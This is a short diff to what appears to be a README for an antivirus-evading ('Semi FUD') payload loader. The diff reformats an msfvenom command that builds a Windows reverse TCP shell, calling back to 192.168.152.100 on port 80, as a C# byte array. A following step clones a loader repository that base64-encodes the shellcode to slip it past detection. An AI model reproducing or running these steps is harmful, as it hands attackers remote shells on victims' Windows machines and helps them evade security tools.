@@ -15,8 +15,7 @@ Semi FUD
 
 generate a csharp bytearray with msf
 
-msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f c
-sharp -o reverse-tcp.txt
+`msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f c sharp -o reverse-tcp.txt`
 
 Utilize Simple Loader to create an encoded b64 string and insert into the loader
 `git clone https://github.com/cribdragg3r/Simple-Loader.git`
